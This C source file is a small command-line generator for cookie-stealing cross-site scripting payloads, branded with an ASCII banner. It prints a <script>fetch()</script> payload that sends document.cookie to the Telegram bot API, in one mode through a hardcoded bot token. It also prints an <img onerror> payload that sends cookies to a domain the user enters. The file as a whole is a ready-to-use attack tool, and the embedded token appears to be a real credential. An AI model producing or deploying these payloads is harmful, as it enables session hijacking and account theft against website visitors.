#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define RESET "\033[0m"
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define BLUE "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN "\033[36m"
#define WHITE "\033[37m"

void banner(){
   char team_name[] = "Anon404";
   char creator[] = "William Steven";
    printf(CYAN "_______________________________________________________________\n\n");
    printf(" /$$   /$$  /$$$$$$   /$$$$$$           /$$$$$$  /$$   /$$\n");
    printf("| $$  / $$ /$$__  $$ /$$__  $$         /$$__  $$| $$  | $$\n");
    printf("|  $$/ $$/| $$  \\__/| $$  \\__/        | $$  \\__/| $$  | $$\n");
    printf(" \\  $$$$/ |  $$$$$$ |  $$$$$$  /$$$$$$| $$      | $$$$$$$$\n");
    printf("  >$$  $$  \\____  $$ \\____  $$|______/| $$      | $$__  $$\n");
    printf(" /$$/\\  $$ /$$  \\ $$ /$$  \\ $$        | $$    $$| $$  | $$\n");
    printf("| $$  \\ $$|  $$$$$$/|  $$$$$$/        |  $$$$$$/| $$  | $$\n");
    printf("|__/  |__/ \\______/  \\______/          \\______/ |__/  |__/\n");
    printf(WHITE "\nPresented by team %s\nCreated by %s\n",team_name,creator);
    printf(CYAN"_______________________________________________________________\n\n" RESET);
}
int tgb(){
    system("clear && sleep 1");
    banner();
    printf(YELLOW "\n[!] step 1 : goto telegram and search : @myidbot\n[!] step 2 : click the bot named : IDBot\n[!] step 3 : click start button and type : /getid\n[!] step 4 : copy the chat id and paste it bollow\n");
    char chat_id[50];
    printf(GREEN "\n[+] enter you telegram chatid >>> " RESET);
    scanf("%s",&chat_id);
    int opt;
    printf(GREEN "\n\n[+] Do you want to use own bot or build in bot\n\n1) own bot\n2) built-in bot (default)\n\n[+] Enter choise >>> ");
    scanf("%d",&opt);
    if(opt == 1){        
    char token[50];
    printf(GREEN "[+] enter you telegram bot token >>> " RESET);
    scanf("%s",&token);

    printf("\n\n");
    system("sleep 1");
    printf(CYAN "-------------------- INFO ---------------------\n\n");
    printf(GREEN"[+] token : %s\n",token);
    printf("[+] chat id : %s\n",chat_id);
    printf("[+] tamplate : <script>fetch(`https://api.telegram.org/bot(token)/sendMessage?text=cookie : ${document.cookie}&chat_id=(chatid)`)</script>");
    
    printf(CYAN "\n\n------------------------------------------------\n");
    printf("\n\n");
    system("sleep 1");
    printf(GREEN "[+] payload : <script>fetch(`https://api.telegram.org/bot%s/sendMessage?text=cookie : ${document.cookie}&chat_id=%s`)</script>\n\n\nGood bye !!!",token,chat_id);        
        }else if(opt == 2){
    printf("\n\n");
    system("sleep 1");
    printf(CYAN "-------------------- INFO ---------------------\n\n");
    printf("[+] chat id : %s\n",chat_id);
    printf(CYAN "\n\n------------------------------------------------\n");
    printf("\n\n");
    system("sleep 1");
    printf(GREEN "[+] payload : <script>fetch(`https://api.telegram.org/bot7493283301:AAGdZmO75yBqbPZrg59IRBWngzaC_lDdsN4/sendMessage?text=cookie : ${document.cookie}&chat_id=%s`)</script>\n\n\nGood bye !!!",chat_id);
        }else{
            printf(RED "[-] wrong option !");
        }
}
int burppayload(){
    system("clear && sleep 1");
    banner();
    printf(GREEN "\n\n[+] Enter the domain >>> ");
    char domain[60];
    scanf("%s",&domain);
    system("sleep 1");
    printf("\n\n[+] payload : <img src=x onerror=this.src='http://%s/?'+document.cookie;>\n",domain);
}
int main(){
    system("clear && sleep 1");
    banner();
    printf("1) cookie stealing payload for telegram bot (default)\n2) cookie stealing payload with burp collaborator\n\n");
    printf(GREEN "[+] enter your choise >>> " RESET);
    int choise;
    scanf("%d",&choise);
    if(choise == 1){
        printf(CYAN "[+] you entered option %d ! \n",choise);
        system("sleep 1");
        tgb();
    }else if(choise == 2){
        printf(CYAN "[+] you entered option %d\n",choise);
        system("sleep 1");
        burppayload();
        
    }else{
        printf(RED "wrong option ");
    }
return 0;
}
